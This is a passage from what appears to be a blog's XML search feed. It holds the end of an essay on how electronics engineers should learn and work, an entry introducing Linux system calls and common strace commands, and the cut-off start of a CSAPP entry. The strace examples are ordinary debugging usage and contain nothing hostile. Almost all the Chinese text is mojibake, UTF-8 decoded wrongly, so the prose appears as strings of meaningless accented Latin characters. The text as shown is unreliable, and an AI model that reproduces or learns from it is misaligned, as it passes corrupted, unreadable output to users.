å·¥ç¨‹å¸ˆè¦é‡è§†å®è·µï¼Œè‡ªç„¶ç§‘å­¦ä¸ç®¡å‘å±•åˆ°ä½•æ—¶éƒ½ç¦»ä¸å¼€å®éªŒã€‚ç”µå­å­¦æœ¬èº«å°±æ˜¯ ä¸ºäº†æŒ‡å¯¼å·¥ç¨‹å®è·µã€‚æ‰€ä»¥ä¸è¦è°ˆç©ºæ´çš„ç†è®ºã€‚ç°åœ¨å¾ˆå¤šé™¢æ‰€éƒ½é¢ä¸´è¿™æ ·çš„é—®é¢˜ï¼Œæ€»æ˜¯è°ˆä¸€äº›ç©ºæ´çš„ç†è®ºï¼Œç”šè‡³é”™è¯¯çš„ä½†è¿˜ä¸ä»¥ä¸ºç„¶çš„ç†è®ºã€‚å®è·µå¯ä»¥æé«˜å¯¹è‡ªç„¶ç§‘å­¦ çš„è®¤è¯†ç”šè‡³æ”¹å˜ç€æˆ‘ä»¬çš„ä¸–ç•Œè§‚ï¼Œåªæœ‰è¿™ç§è®¤è¯†æé«˜äº†æ‰å¯èƒ½åˆ›é€ å’Œåº”ç”¨æœ‰ä»·å€¼çš„ç†è®ºã€‚æˆ‘ä»¬ä¸è¦â€œç©å¼„ç†è®ºâ€ï¼Œä½†è¦é‡è§†ç†è®ºã€‚ç†è®ºæ˜¯æ€æƒ³ï¼Œæ˜¯è®¤è¯†ï¼Œä¸æ˜¯å…¬å¼å’Œæ–‡å­—ã€‚</p><p>  å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬è¿˜è¦é‡è§†ç†è®ºã€‚å› ä¸ºä½ æ˜¯ç”µå­å·¥ç¨‹å¸ˆï¼Œè€Œä¸æ˜¯ç”µå­çˆ±å¥½è€…ã€‚å·¥ç¨‹å¸ˆè¦ä»æ•´ä½“åˆ°ç»†èŠ‚å…¨é¢çš„æŠŠæ§ä½ çš„å·¥ç¨‹ã€‚äººåšäº‹æ˜¯ä¸€å®šè¦çŠ¯é”™è¯¯çš„ï¼Œå·¥ç¨‹å¸ˆè¦å°†è¿™æ · çš„é”™è¯¯å‡åˆ°æœ€å°‘ã€‚å› æ­¤å…¨é¢çš„ç†è®ºå’Œå¯¹å·¥ç¨‹å¯¹è±¡çš„è®¤è¯†æ˜¯å¿…é¡»çš„ã€‚ä¸€äº›ä»ç”µå­çˆ±å¥½è€…å‡ºèº«çš„å·¥ç¨‹å¸ˆæ¯”è¾ƒå®¹æ˜“å¿½è§†ç†è®ºï¼Œè®¤ä¸ºæŠŠä¸œè¥¿åšå‡ºæ¥äº†å°±å¯ä»¥ã€‚å½“ç„¶æ˜¯è¦æŠŠä¸œè¥¿ ä½œå‡ºæ¥ï¼Œä½†æˆ‘ä»¬æœ€ç»ˆæ˜¯è¦æŒæ¡å°–ç«¯çš„æŠ€æœ¯ï¼Œæ¨åŠ¨ä¸­å›½ç§‘æŠ€çš„å‘å±•ã€‚ä¸å¯èƒ½è±¡ç”µå­çˆ±å¥½è€…é‚£æ ·æ‹¿è¿‡åˆ«äººçš„å›¾çº¸æ¥â€œåˆ¶ä½œâ€äº†äº‹ã€‚ITæŠ€æœ¯å‘å±•è¿…é€Ÿï¼Œç†è®ºçš„å‘å±•ä¹Ÿéå¸¸ è¿…é€Ÿã€‚æˆ‘ä»¬ä¸€å®šè¦æ¥å—æ½®æ°´èˆ¬çš„æ–°è§‚å¿µå’Œæ–°æŠ€æœ¯ï¼Œå·¥ç¨‹å¸ˆå¿…é¡»æœ‰å…¨é¢è€Œåˆåšå®çš„ç†è®ºä½œä¸ºåç›¾ã€‚æˆ‘ä»¬å­¦ä¹ ä¿¡æ¯æŠ€æœ¯å°±å¥½æ¯”ç›–ä¸€åº§å¤§å¦ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå¿«æŒæ¡æµè¡Œçš„å¼€å‘ å·¥å…·å’ŒæŠ€æœ¯â€“å¯ä»¥ç›–ä¸ªæ¯”è¾ƒé«˜çš„å¤§æ¥¼ï¼Œå¯æ˜¯æ²¡æœ‰å…¨é¢åšå®çš„ç†è®ºä½œä¸ºåœ°åŸºï¼Œæ˜¯ä¸å¯èƒ½ç›–æˆæ‘©å¤©å¤§å¦çš„ã€‚è€Œä¸”ç†è®ºä½“ç³»ä¸€å®šè¦å®Œæ•´ï¼ŒITæŠ€æœ¯æœ¬èº«å°±æ˜¯å¤šå­¦ç§‘äº¤å‰äº§ ç”Ÿçš„ï¼Œå®ƒå·²ç»æ¶‰åŠå¤ªå¤šçš„ä¸œè¥¿äº†ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªè¡Œä¸šå†…å¦‚æœæŒæ¡æ›´å¤šæ›´å…¨é¢çš„çŸ¥è¯†æ˜¯éå¸¸å¿…è¦çš„ã€‚æç¡¬ä»¶çš„å¾€å¾€å®¹æ˜“å¿½ç•¥è½¯ä»¶æ–¹é¢çš„ä¸œè¥¿ã€‚ç°åœ¨å“ªé‡Œæœ‰ç¦»å¼€è½¯ä»¶çš„ç¡¬ä»¶ å’Œç¦»å¼€ç¡¬ä»¶çš„è½¯ä»¶å‘¢ï¼Ÿè€Œä¸”ä¸€ä¸ªå·¥ç¨‹å¸ˆä¸ä»…è¦æ‡‚å¾—æœ¬ä¸“ä¸šçš„çŸ¥è¯†ï¼Œè¿˜è¦æœ‰å¹¿æ³›çš„è‡ªç„¶ç§‘å­¦çŸ¥è¯†ï¼Œåªæœ‰è¿™æ ·æ‰èƒ½æˆä¸ºå‡ºè‰²çš„å·¥ç¨‹æŠ€æœ¯äººå‘˜ã€‚</p><p>  åŸ¹å…»è‡ªå·±çš„å­¦ä¹ æ–¹æ³•ä¹Ÿæ˜¯å·¥ç¨‹å¸ˆçš„å¿…ä¿®è¯¾ã€‚çŸ¥è¯†çˆ†ç‚¸çš„å¹´ä»£é‡Œï¼Œä»…ä»…é å­¦æ ¡é‡Œ å­¦æ¥çš„ä¸€ç‚¹çš®æ¯›æƒ³æˆä¸ºä¼˜ç§€çš„å·¥ç¨‹å¸ˆæ˜¯ä¸å¯èƒ½çš„ï¼Œ90%çš„çŸ¥è¯†éƒ½è¦é è‡ªå·±å»å­¦ä¹ ã€‚å¾ˆå¤šå­¦æ ¡åˆšæ¯•ä¸šçš„å­¦ç”Ÿå¹¶ä¸ä¼šè‡ªå­¦ã€‚æ‹¿è¿‡ä¸€æœ¬ä¹¦æ¥ä¸€é˜µçœ‹ï¼Œçœ‹ä¸æ‡‚å°±å’¬ç‰™çœ‹ä¸‹ å»ï¼Œæœ€åä»åœ¨ä¸€è¾¹ã€‚å…¶å®è‡ªå­¦æ˜¯éå¸¸è®²ç©¶æŠ€å·§å’Œæ–¹æ³•çš„ã€‚å½“ç„¶æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„ä¸€å¥—å¥½åŠæ³•ã€‚æˆ‘é€šå¸¸æŠŠçŸ¥è¯†åˆ†æˆå‡ ç±»ï¼š</p><p>1.åŸºç¡€çŸ¥è¯† â€”-åŒ…æ‹¬æ•°ç‰©åŒ–å’Œä¸“ä¸šåŸºç¡€ã€‚ </p><p>2.æµè¡Œçš„æŠ€æœ¯ â€”-æ¯”å¦‚åµŒå…¥å¼ç³»ç»Ÿå¼€å‘ï¼Œå¤§å®¶éƒ½åœ¨åšçš„æŠ€æœ¯ã€‚ </p><p>3.æœªæ¥å°†è¦æµè¡Œçš„æŠ€æœ¯ â€”-æ¯”å¦‚ç”Ÿç‰©DSPæŠ€æœ¯ï¼Œå°±æ˜¯ä½ å¯¹æœªæ¥çš„é¢„æµ‹ã€‚ </p><p>4.æˆ‘è¦ç”¨åˆ°çš„æŠ€æœ¯ â€”-å°±æ˜¯ä½ å·¥ç¨‹ä¸­æ€¥éœ€ä½¿ç”¨çš„ã€‚ </p><p>5.å…¶ä»–å­¦ç§‘çš„é‡è¦è¿›å±• â€”-ç´§è·Ÿç§‘æŠ€å‘å±•çš„è„šæ­¥æ˜¯å¿…é¡»çš„ã€‚</p><p>  æˆ‘é€šå¸¸å‡åŒ€çš„åˆ†é…æ—¶é—´ï¼Œè€Œä¸å¿½ç•¥ä»»ä½•ä»»ä½•ä¸€ä¸ªæ–¹é¢çš„è¿›å±•ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯çŸ¥è¯†ä½“ç³»çš„ä¸æ–­æ›´æ–°å’Œæ‰©å……ã€‚è¿™åªæ˜¯å®è§‚ä¸Šçš„ç²¾åŠ›åˆ†é…ï¼Œå…·ä½“çš„å­¦ä¹ è¿‡ç¨‹å½“ç„¶å› äººè€Œå®šï¼Œ ä½†ä¸€å®šè¦æœ‰æˆ˜ç•¥çš„è¿›è¡Œã€‚å·¥ç¨‹å¸ˆåšä»»ä½•äº‹æƒ…éƒ½è¦æœ‰è®¡åˆ’æœ‰æ­¥éª¤çš„å»æ‰§è¡Œã€‚é€»è¾‘ä¸ä»…ä»…æ˜¯ä½“ç°åœ¨ç¨‹åºä¸­æ›´è¦ä½“ç°åœ¨å­¦ä¹ å’Œç”Ÿæ´»çš„è¿›ç¨‹ä¸­ï¼Œä¹Ÿå°±æ˜¯åšä»»ä½•äº‹éƒ½è¦ç§‘å­¦çš„å®‰ æ’æ—¶é—´ï¼Œæ ¹æ®è‡ªå·±çš„æƒ…å†µåˆ¶å®šæ–¹æ¡ˆã€‚å¤§å®¶å¯ä»¥å‚è€ƒâ€œå¤§è„‘æ€ç»´å›¾è°±â€çš„æ–¹æ³•ã€‚</p><p>  å·¥ç¨‹å¸ˆåšäº‹è¦ä¸¥è°¨æ±‚å®ã€‚ç¥å·é£èˆ¹ç”±å¤šå°‘å¤æ‚çš„ç³»ç»Ÿæ„æˆï¼Œå¦‚æœæ¯ä¸ªéƒ¨ä»¶éƒ½æœ‰99.9%çš„æˆåŠŸç‡ï¼Œææ€•åˆ°æœ€åè¿”å›çš„æ—¶å€™è¿ä¸€åŠçš„å®‰å…¨æ€§éƒ½è°ˆä¸ä¸Šã€‚æ‰€ä»¥å·¥ç¨‹å¸ˆä¸€ å®šè¦ä¸¥è°¨ï¼Œä»æ•´ä½“åˆ°æ¯ä¸ªç»†èŠ‚éƒ½è¦æœ‰è¶³å¤Ÿçš„é‡è§†ç¨‹åº¦ã€‚åƒé‡Œä¹‹å ¤æºƒäºèšç©´å°±æ˜¯è¿™ä¸ªé“ç†ã€‚å·¥ç¨‹å¸ˆä¸èƒ½æ¥å—â€œå·®ä¸å¤šâ€è¿™æ ·çš„è¯æ±‡ã€‚è¡Œå°±æ˜¯è¡Œï¼Œä¸è¡Œå°±æ˜¯ä¸è¡Œï¼Œè¿™æ˜¯å·¥ ç¨‹å¸ˆæœ€åŸºæœ¬çš„ç´ è´¨ã€‚ä¸€æ¬¡å…¬å¸é‡Œçš„ä¸€ä¸ªå·¥ç¨‹å¸ˆæ‹¿äº†ä¸€å—ä½œå¥½çš„è¶…å£°å‰ç«¯æ¿äº¤ç»™æˆ‘ï¼Œå¹¶è¯´æ¿å·²OKäº†ã€‚å¯å½“æˆ‘é—®ä»–ä¿¡å™ªæ¯”å¦‚ä½•æ—¶ï¼Œå´å›ç­”æˆ‘â€œå·®ä¸å¤šâ€ã€‚æˆ‘ç†è§£å·®ä¸å¤š å°±è¿˜å·®ï¼Œè®©ä»–æ‹¿å›å»ä»€ä¹ˆæ—¶å€™ä¸å·®äº†å†äº¤ç»™æˆ‘ã€‚æ‰€ä»¥å·¥ç¨‹å¸ˆè¦ç”¨æŒ‡æ ‡è¯´è¯ï¼Œè¦ç”¨å®è·µè¯´è¯ï¼Œå·®ä¸å¤šä¸æ˜¯å·¥ç¨‹å¸ˆçš„å˜´é‡Œåº”è¯¥å‡ºç°çš„è¯æ±‡ã€‚</p><p>  å·¥ç¨‹å¸ˆè¿˜è¦æ³¨é‡ç§¯ç´¯ã€‚ä¸€ä¸ªå¥½çš„ç¨‹åºå‘˜å’Œç”µè·¯è®¾è®¡å¸ˆå°±æ˜¯ä¸€ä¸ªå¥½çš„æ”¶è—å®¶ï¼Œä¸ä»…æ”¶è—è‡ªå·±çš„æ™ºæ…§ç»“æ™¶æ›´è¦æ”¶è—åˆ«äººçš„æ™ºæ…§ç»“æ™¶ã€‚ITæŠ€æœ¯é¢†åŸŸæœ‰æ— æ•°çš„å·¨åŒ å’Œå¤©æ‰å°† ä»–ä»¬æ™ºæ…§æ²‰æ·€äºç°ä»£ç§‘æŠ€ä¹‹ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¸æ–­çš„ç§¯ç´¯å¥½çš„åšæ³•å’Œå‰äººçš„æ€æƒ³ã€‚ä½ çš„å‘¨å›´ä¼šæœ‰å¾ˆå¤šäººçš„å¾ˆå¤šä¸œè¥¿å€¼å¾—ä½ å­¦ä¹ ï¼Œä½ åº”è¯¥å°†è¿™äº›ä½œä¸ºè´¢å¯Œç§¯ç´¯èµ·æ¥ï¼Œæ€»æœ‰ ä¸€å¤©ä¼šå‘æŒ¥å‡ºä½œç”¨ã€‚å¦å¤–æˆ‘ä»¬å­¦ä¹ çš„ä¸ä»…æ˜¯ç®€å•çš„çŸ¥è¯†æ›´æ˜¯å‰äººå¯¹çŸ¥è¯†çš„ç†è§£å’Œå¯¹å·¥ç¨‹çš„çœ‹æ³•ã€‚æ¯”å¦‚æ¯ä¸ªäººçœ¼ä¸­çš„ç”µé˜»éƒ½ä¸ç›¸åŒï¼Œä½ è¦ä¸»åŠ¨å»äº†è§£é«˜æ‰‹çœ¼ä¸­çš„ç”µé˜»æ˜¯ ä»€ä¹ˆä¸œè¥¿ã€‚</p><p>  å·¥ç¨‹å¸ˆä¸è¦è¿‡åˆ†çš„å°†æ³¨æ„åŠ›æ”¾åˆ°å¼€å‘æœ¬èº«è€Œçœ‹ä¸æ¸…â€œå¼€å‘â€ã€‚è¿™æ ·çš„è¯å¬èµ·æ¥æœ‰äº›ç»•å£,ä½†å…¶å®å¾ˆç®€å•,å°±æ˜¯è¦åœ¨ä¸€å®šçš„é«˜åº¦ä¸Šçœ‹æ•´ä¸ªå¼€å‘è¿‡ç¨‹,è€Œä¸è¦é™·å…¥æŸä¸ªå…· ä½“é—®é¢˜æ— æ³•è‡ªæ‹”ã€‚ä¸è¯†åºå±±çœŸé¢ç›®ï¼Œåªå› èº«åœ¨æ­¤å±±ä¸­ã€‚å°±æ˜¯è¿™ä¸ªé“ç†ã€‚å°¤å…¶æ˜¯é‡åˆ°é—®é¢˜åå®¹æ˜“å‡ºç°æ— æ³•è‡ªæ‹”çš„ç°è±¡ï¼Œç»“æœä¸€å¤´é›¾æ°´ä»€ä¹ˆéƒ½æ˜¯ä¸€å›¢ç³Ÿï¼Œè¿™æ—¶å°±éœ€è¦ä»æ›´ é«˜çš„è§’åº¦ä»æ–°å®¡è§†é—®é¢˜ï¼Œæ‰¾åˆ°çªç ´å£ï¼Œè€Œä¸è¦é’»äº†ç‰›è§’å°–ã€‚</p><p>  å·¥ç¨‹å¸ˆä¸è¦è½»æ˜“é—®åˆ«äººé—®é¢˜ï¼Œè§£å†³é—®é¢˜çš„è¿‡ç¨‹å’Œç»“æœåŒæ ·é‡è¦ã€‚æœ‰ä¸€äº›åŒå­¦ä¼šç»å¸¸å‘è€å¸ˆæå‡ºé—®é¢˜ï¼Œè¿™ä¹Ÿæ˜¯å¥½äº‹ï¼Œè¯´æ˜æŸæŸå­¦ç”Ÿçˆ±å­¦ä¹ ã€‚å¯æˆ‘ä»¬å¹¶ä¸æå€¡è¿™äº›ï¼Œç›¸å çš„å¦‚æœèƒ½è‡ªå·±è§£å†³é—®é¢˜æ‰æ˜¯æœ€å¥½çš„ã€‚è¦å­¦ä¼šç‹¬ç«‹çš„çŒå–ä¿¡æ¯å’ŒçŸ¥è¯†ï¼Œå¹¶ä»å…¶ä¸­å¾—åˆ°è‡ªå·±åˆ¤æ–­ã€‚æ¯ä¸ªäººåœ¨å·¥ä½œä¸­éƒ½ä¼šé‡åˆ°å¾ˆå¤šé—®é¢˜ï¼Œåœ¨å­¦æ ¡çš„æ—¶å€™æœ‰è€å¸ˆå»è§£ç­”ï¼Œåœ¨å·¥ ä½œå•ä½åˆæœ‰è°èƒ½è§£ç­”å‘¢ï¼Ÿæˆ–è€…å½“ä½ åšçš„æ˜¯æœ€å°–ç«¯çš„æŠ€æœ¯æ—¶ä½ èƒ½å»é—®è°å‘¢ï¼æ‰€ä»¥å·¥ç¨‹å¸ˆè¦æœ‰ç‹¬ç«‹å¤„ç†é—®é¢˜çš„èƒ½åŠ›ã€‚ä¸è¦åšæ€æƒ³ä¸Šæ‡’æƒ°çš„äººã€‚ä¸­å›½æ•™è‚²å¾€å¾€è¦æ±‚å­¦ç”Ÿè€ƒå‡º é«˜åˆ†ï¼Œç­”å¯¹ç­”æ¡ˆå°±æ˜¯å¥½å­¦ç”Ÿã€‚æ‰€ä»¥è€å¸ˆå‘Šè¯‰çš„ç­”æ¡ˆåªè¦è®°ä½å°±OKã€‚å¯è€å¸ˆå‘Šè¯‰ä½ çš„ç­”æ¡ˆèƒ½è¯´æ˜ä½ è‡ªå·±å…·å¤‡äº†è§£é¢˜èƒ½åŠ›å—ï¼Ÿè¯·ä¸è¦ç›¸ä¿¡è¿™æ ·çš„åˆ†æ•°ï¼Œè‡³å°‘å®ƒæ— æ³•åæ˜  ä½ çš„çœŸå®æ°´å¹³ã€‚</p><p>  å·¥ç¨‹å¸ˆè¦æœ‰ã€Šäº®å‰‘ã€‹ç²¾ç¥ã€‚ç”¨éƒ½æ¢çš„è¯è¯´ï¼Œå¤ä»£å‰‘å®¢æ˜çŸ¥å¯¹æ–¹æ˜¯å¤©ä¸‹ç¬¬ä¸€å‰‘å®¢ï¼Œæ˜çŸ¥æ˜¯æ­»ä¹Ÿè¦äº®å‡ºå®å‰‘ï¼Œæ²¡æœ‰è¿™ä¸ªæœ¬äº‹å°±åˆ«å½“å‰‘å®¢ã€‚â€œå°½ç®¡æ•Œå¼ºæˆ‘å¼±ï¼Œå°½ç®¡èº«é™·é‡ å›´ï¼Œæˆ‘ä»¬ä¹Ÿè¦äº®å‰‘â€ã€‚å·¥ç¨‹å¸ˆä¹Ÿè¦æ•¢äºæŒ‘æˆ˜å¯¹æ‰‹ï¼Œæ•¢äºæˆ˜èƒœè‡ªå·±ã€‚ä¸€é¡¹å·¥ç¨‹å¦‚æœè¿åšéƒ½ä¸æ•¢åšè¿˜èƒ½è°ˆæˆåŠŸçš„é—®é¢˜å—ï¼ŸæˆåŠŸæ˜¯ä¸€ç§ä¹ æƒ¯ï¼Œä¸€ç§æ¥æºäºè‡ªå·±çš„ä¿¡å¿ƒã€‚æˆ˜ç•¥ ä¸Šè½»è§†â€œæ•Œäººâ€ï¼Œæˆ˜æœ¯ä¸Šé‡è§†â€œæ•Œäººâ€ã€‚</p><p>  å·¥ç¨‹å¸ˆå³è¦æœ‰ä¸ªäººè‹±é›„ä¸»ä¹‰æƒ…èŠ‚åˆè¦èƒ½èå…¥å›¢é˜Ÿã€‚å‡ºè‰²çš„ä¸ªäººèƒ½åŠ›å’Œäººæ ¼é­…åŠ›æ˜¯ä½•ç­‰çš„å®è´µã€‚æˆ‘ä»¬åœ¨å´‡æ‹œç›–èŒ¨å’Œä¹”å¸ƒæ–¯çš„åŒæ—¶ä¸è¦å¿˜è®°ä»–ä»¬èº«ååºå¤§è€Œåˆé«˜æ•ˆçš„ç ”å‘å›¢é˜Ÿã€‚ä»¥ä¸€æˆŸä¹‹åŠ›å®Œæˆéœ¸ä¸šçš„è‹±é›„å·²ä¸å±äºè¿™ä¸ªæ—¶ä»£ã€‚æ‰€ä»¥å›¢é˜Ÿçš„åˆä½œæ‰æ˜¯åˆ›é€ ç¥è¯çš„å¿…ç»ä¹‹è·¯ã€‚</p><p>  å·¥ç¨‹å¸ˆè¦æœ‰å‘å±•çš„çœ¼å…‰ï¼Œä¸ä»…è¦èƒ½åœ¨å¤æ‚çš„æŠ€æœ¯å’Œå¸‚åœºé¢å‰æ¸¸åˆƒæœ‰ä½™ï¼Œæ›´è¦å¯¹æœªæ¥çš„å‘å±•æ€åŠ¿åšå‡ºç²¾ç¡®çš„å±•æœ›ã€‚åªæœ‰æ¯”åˆ«äººæƒ³çš„è¿œæ‰èƒ½æ¯”å¯¹æ‰‹èµ°çš„æ›´è¿œã€‚å½“ç„¶è¿™ä¸åš å®çš„åŸºç¡€å’Œå‹¤å¥‹çš„æ€è€ƒæ˜¯å¯†ä¸å¯åˆ†çš„ï¼Œåœ¨ç¾¤é›„é€é¹¿çš„å½“ä»ŠITç•Œï¼Œææ€•éœ€è¦æ›´å¤šçš„èƒ†è¯†æ‰èƒ½åšåˆ°ã€‚è¦ä¸æ–­çš„å…³æ³¨æŠ€æœ¯å’Œå¸‚åœºä»¥åŠå…¶å®ƒé¢†åŸŸçš„å‘å±•ï¼Œä»€ä¹ˆæ—¶å€™è¿™ç§å…³æ³¨ æ”¾æ¾ï¼Œä»€ä¹ˆæ—¶å€™å°±ä¼šè¢«ç«äº‰æ‰€æ·˜æ±°ã€‚</p><p>  è¦åœ¨ç«äº‰å’Œè§£å†³é—®é¢˜ä¸­ä½“ä¼šç”Ÿæ´»ï¼Œç ”å‘å’Œç«äº‰æ˜¯æ¯ä¸ªå·¥ç¨‹å¸ˆä¸å¯é¿å…çš„ç°å®ã€‚å¤§å®¶æ¯å¤©éƒ½ä¼šé‡åˆ°æ–°çš„å›°éš¾ï¼Œå¯è¿™æ‰æ˜¯å·¥ç¨‹å¸ˆçš„ç”Ÿæ´»ï¼Œè¦è½»æ¾çš„æ´»åœ¨è¿™äº›é—®é¢˜ä¹‹ä¸­ï¼Œå¹¶ ä½“ä¼šå…¶ä¸­çš„å¿«ä¹å’ŒæˆåŠŸæ—¶åˆ»çš„å…´å¥‹ã€‚å¾ˆå¤šå·¥ç¨‹å¸ˆæŠ±æ€¨è¯´åšç ”å‘å¤ªç´¯äº†ï¼Œè¿™é‡Œçš„â€œç´¯â€æ˜¯ä¸€ç§å¿ƒç†çš„æ„Ÿå—ï¼Œå·¥ç¨‹å¸ˆçš„èŒä¸šå°±æ˜¯ä¸æ–­çš„å…‹æœå›°éš¾è¿æ¥æ–°çš„æŒ‘æˆ˜ã€‚æˆ‘åˆšå¼€å§‹ åšç ”å‘æ—¶ä¹Ÿæ•´å¤©æ„çœ‰ä¸å±•ï¼Œå¯ç°åœ¨åŒæ—¶åšå‡ ä¸ªå¤§çš„å·¥ç¨‹ï¼ŒåŒæ—¶é¢å¯¹å‡ åä¸ªæŠ€æœ¯éš¾é¢˜ï¼Œæˆ‘è§‰å¾—è‡ªå·±æ¯å¤©å› ä¸ºèƒ½åšè¿™æ ·çš„äº‹æƒ…è€Œæ„Ÿåˆ°éå¸¸çš„å¿«ä¹å’Œå……å®ï¼Œå¦‚æœå“ªå¤©è‡ªå·±æ²¡ äº‹å¯åšå°±ä¼šè§‰å¾—å¾ˆä¸é€‚åº”ï¼Œæ€»è¦æ‰¾äº›é—®é¢˜æ¥æ€è€ƒã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ–‡æ‘˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linuxç³»ç»Ÿå·¥å…·ï¼šstrace</title>
    <link href="/p/d936e762/"/>
    <url>/p/d936e762/</url>
    
    <content type="html"><![CDATA[<h1 id="ç³»ç»Ÿè°ƒç”¨ç®€ä»‹"><a href="#ç³»ç»Ÿè°ƒç”¨ç®€ä»‹" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨ç®€ä»‹"></a>ç³»ç»Ÿè°ƒç”¨ç®€ä»‹</h1><p>è¿›ç¨‹é€šè¿‡<strong>ç³»ç»Ÿè°ƒç”¨</strong>ä½¿ç”¨å†…æ ¸æœåŠ¡ã€‚ç³»ç»Ÿè°ƒç”¨ä¼šè¿›å…¥å†…æ ¸ï¼Œè®©å†…æ ¸æ‰§è¡ŒæœåŠ¡ç„¶åè¿”å›<br><img src="https://img-blog.csdnimg.cn/c2244f0c54164008988ed3e58eda9cff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>ä¸€äº›å¸¸è§çš„ç³»ç»Ÿè°ƒç”¨:</strong></p><table><thead><tr><th>ç³»ç»Ÿè°ƒç”¨</th><th>æè¿°</th></tr></thead><tbody><tr><td>fork()</td><td>åˆ›å»ºè¿›ç¨‹</td></tr><tr><td>exit()</td><td>ç»“æŸå½“å‰è¿›ç¨‹</td></tr><tr><td>wait()</td><td>ç­‰å¾…å­è¿›ç¨‹ç»“æŸ</td></tr><tr><td>exec(filename, *argv)</td><td>åŠ è½½å¹¶æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶</td></tr><tr><td>open(filename, flags)</td><td>æ‰“å¼€æ–‡ä»¶ï¼Œflags æŒ‡å®šè¯»/å†™æ¨¡å¼</td></tr><tr><td>read(fd, buf, n)</td><td>ä»æ–‡ä»¶ä¸­è¯» n ä¸ªå­—èŠ‚åˆ° buf</td></tr><tr><td>write(fd, buf, n)</td><td>ä» buf ä¸­å†™ n ä¸ªå­—èŠ‚åˆ°æ–‡ä»¶</td></tr><tr><td>close(fd)</td><td>å…³é—­æ‰“å¼€çš„ fd</td></tr><tr><td>unlink(filename)</td><td>åˆ é™¤æ–‡ä»¶</td></tr></tbody></table><h1 id="straceçš„å¸¸è§ç”¨æ³•"><a href="#straceçš„å¸¸è§ç”¨æ³•" class="headerlink" title="straceçš„å¸¸è§ç”¨æ³•"></a>straceçš„å¸¸è§ç”¨æ³•</h1><p>straceå¯ä»¥ä½¿ä½ åœ¨ä¸çŸ¥é“ç¨‹åºæºä»£ç çš„æƒ…å†µä¸‹è·Ÿè¸ªåº”ç”¨ç¨‹åºçš„ç³»ç»Ÿè°ƒç”¨</p><p>è®©æˆ‘ä»¬æ‰“å¼€tldræŸ¥çœ‹straceçš„å¸¸è§ç”¨æ³•ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Troubleshooting tool <span class="hljs-keyword">for</span> tracing <span class="hljs-keyword">system</span> calls.<br>  More information: <span class="hljs-keyword">https</span>://manned.org/strace.<br><br>  - Start tracing <span class="hljs-keyword">a</span> specific <span class="hljs-built_in">process</span> <span class="hljs-keyword">by</span> its PID:<br>    strace -p pid<br><br>  - Trace <span class="hljs-keyword">a</span> <span class="hljs-built_in">process</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">filter</span> output <span class="hljs-keyword">by</span> <span class="hljs-keyword">system</span> call:<br>    strace -p pid -e system_call_name<br><br>  - Count <span class="hljs-built_in">time</span>, calls, <span class="hljs-keyword">and</span> errors <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">system</span> call <span class="hljs-keyword">and</span> report <span class="hljs-keyword">a</span> summary <span class="hljs-keyword">on</span> <span class="hljs-title">program</span> <span class="hljs-title">exit</span>:<br>    strace -p pid -c<br><br>  - Show <span class="hljs-keyword">the</span> <span class="hljs-built_in">time</span> spent <span class="hljs-keyword">in</span> every <span class="hljs-keyword">system</span> call:<br>    strace -p pid -T<br><br>  - Start tracing <span class="hljs-keyword">a</span> program <span class="hljs-keyword">by</span> executing <span class="hljs-keyword">it</span>:<br>    strace program<br><br>  - Start tracing <span class="hljs-built_in">file</span> operations <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> program:<br>    strace -e trace=<span class="hljs-built_in">file</span> program<br></code></pre></td></tr></table></figure><p>æ‰“å°å‡ºè¿è¡Œ<code>echo wdnmd </code>è¿‡ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ï¼š<br><img src="https://img-blog.csdnimg.cn/4c57f58559694d13857a121a2315dd9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPPï¼šç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º-3</title>
    <link href="/p/a9307f29/"/>
    <url>/p/a9307f29/</url>
    
